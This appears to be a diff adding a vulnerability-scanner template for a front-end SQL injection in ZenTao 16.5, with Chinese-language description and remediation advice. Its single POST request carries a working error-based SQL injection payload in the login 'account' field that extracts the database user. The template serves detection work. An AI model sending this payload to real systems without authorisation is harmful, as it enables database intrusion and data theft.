@@ -1,0 +1,26 @@
+id: Changdao-165-SQLi
+info:
+  name: 禅道 16.5 sql  注入
+  author:
+  - l0ne1y
+  description: |-
+    禅道 16.5 SQLi漏洞
+    禅道是第一款国产的开源项目管理软件，在禅道16.5版本存在前台SQLI，攻击者可利用该漏洞获取数据库信息。
+  severity: high
+  remediation: |-
+    ## 官方方案
+    升级至最新版本.
+
+    ## 临时方案
+    修改注入点数据库查询处为预编译形式，而不是原本的字符串拼接。
+requests:
+- matchers:
+  - type: word
+    condition: or
+    words:
+    - sqli
+    - "~"
+  path:
+  - '{{BaseURL}}/zentao/user-login.html'
+  method: POST
+  body: account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23
